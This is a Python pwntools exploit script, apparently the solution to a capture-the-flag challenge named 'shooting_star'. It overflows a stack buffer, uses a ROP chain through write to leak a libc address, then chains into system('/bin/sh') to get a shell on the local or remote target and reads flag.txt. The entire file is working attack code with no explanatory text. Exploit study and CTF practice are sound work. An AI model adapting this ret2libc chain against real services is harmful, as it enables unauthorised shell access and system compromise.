#!/usr/bin/env python3

from pwn import *
import sys

context.arch = "amd64"

def exploit(io, elf, libc):

    write_got = elf.got["write"]
    write = 0x40124f
    rop = ROP(elf)
    pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]
    ret = rop.find_gadget(["ret"])[0]
    
    # leak libc
    rop_chain = flat(pop_rsi_r15, write_got, 0, write)
    io.sendlineafter(b"> ", b"1")
    payload = b"A"*72 + rop_chain
    io.sendlineafter(b"> ", payload)
    io.recvuntil(b"true!\n")
    leak = u64(io.recv(6).ljust(8, b"\x00"))
    libc.address = leak - libc.symbols["write"]
    print("libc: ", hex(libc.address))

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    binsh = next(libc.search(b"/bin/sh"))
    system = libc.symbols["system"]
    rop_chain = flat(pop_rdi, binsh, system)
    payload = b"A"*72 + rop_chain
    
    io.sendline(b"1")
    io.sendlineafter(b"> ", payload) 
    io.recv()
    sleep(0.2)

    io.sendline(b"cat flag.txt")
    flag = io.recv().decode()
    print(flag)


def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./shooting_star")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT) 
    elf = ELF("./shooting_star")
    libc = ELF("./libc.so.6")
    exploit(io, elf, libc)

if __name__ == "__main__":
    main()


